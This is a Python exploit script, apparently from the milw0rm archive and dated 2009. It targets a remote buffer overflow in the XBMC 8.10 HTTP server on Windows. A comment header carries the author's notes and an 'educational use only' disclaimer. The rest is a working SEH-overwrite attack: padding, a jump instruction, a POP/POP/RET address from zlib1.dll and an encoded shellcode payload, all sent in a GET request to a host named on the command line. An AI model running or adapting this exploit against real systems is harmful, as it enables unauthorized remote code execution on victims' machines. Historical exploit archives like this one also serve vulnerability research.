#!/usr/bin/env python 

'''
Xbmc get request remote buffer overflow 8.10 *seh*(Universal address)!!  

Tested:Win xp sp2 eng Win vista sp1
Vendor url:http://xbmc.org/ 
Release date:April the 4th 2009

versions affected: windows all versions. 

I had tried awhile to get a nice pop ebx pop ret address and just   
could not find a suitable one especially that was any good.and it   
had to be shipped with the application and not have /safe seh.  
  
To start with i looked at the zlib.dll to see of there were any 
nice pop pop ret address i noticed there was one in particular that 
stood out and decided to try it. 
 
There is no need for me to release any more exploits for this application  
as i have covered all the areas which i wanted to and want to   
move on from this. 
 
If your interested to see how this worked attach a debugger and add some 
hit tracing :).It is possible to use this with all the buffer overflows 
i released. 

Credits to n00b for finding the buffer overflow and writing  
exploit.

----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.

I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!
'''


import sys, socket 
import struct

port = 80 
host = sys.argv[1] 

#1635
Junk_buffer1 = 'A'*998
Pointer_To_Next_SEH = struct.pack('<L',0x909006eb)

###
###/SafeSEH Module Scanner, item 55
# SEH mode=/SafeSEH OFF
# Base=0x62e80000
# Limit=0x62e97000
# Module Name=C:\Program Files\XBMC\zlib1.dll

###
###This was found in the module zlib1 and is universal.
#62E83BAC   5B               POP EBX
#62E83BAD   5D               POP EBP
#62E83BAE  ^E9 CDD9FFFF      JMP zlib1.compressBound
SE_Handler = struct.pack('<L',0x62E83BAC)


Junk_buffer3 = 'D'*635
Shell_code=(#
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x54\x4e\x33\x4b\x38\x4e\x57"
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x41\x4b\x38"
"\x4f\x35\x42\x42\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x58"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"
"\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x54"
"\x4b\x58\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"
"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x53"
"\x42\x4c\x46\x46\x4b\x48\x42\x44\x42\x43\x45\x38\x42\x4c\x4a\x37"
"\x4e\x50\x4b\x48\x42\x44\x4e\x50\x4b\x48\x42\x57\x4e\x51\x4d\x4a"
"\x4b\x48\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x58\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x46\x4e\x43\x4f\x55\x41\x43"
"\x48\x4f\x42\x56\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x55\x4a\x46\x4f\x4e\x50\x4c\x42\x4e\x42\x46\x4a\x36\x4a\x49"
"\x50\x4f\x4c\x48\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x46\x41\x56"
"\x4e\x46\x43\x56\x50\x42\x45\x56\x4a\x37\x45\x36\x42\x30\x5a"
)

# create a socket object called 'c' 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# connect to the socket 
c.connect((host, port)) 

Request = (Junk_buffer1 + Pointer_To_Next_SEH + SE_Handler + Shell_code + Junk_buffer3)

# create a file-like object to read 
fileobj = c.makefile('r', 0) 

# Ask the server for the file 
fileobj.write("GET /"+Request+" HTTP/1.1\n\n") 

# milw0rm.com [2009-04-06]
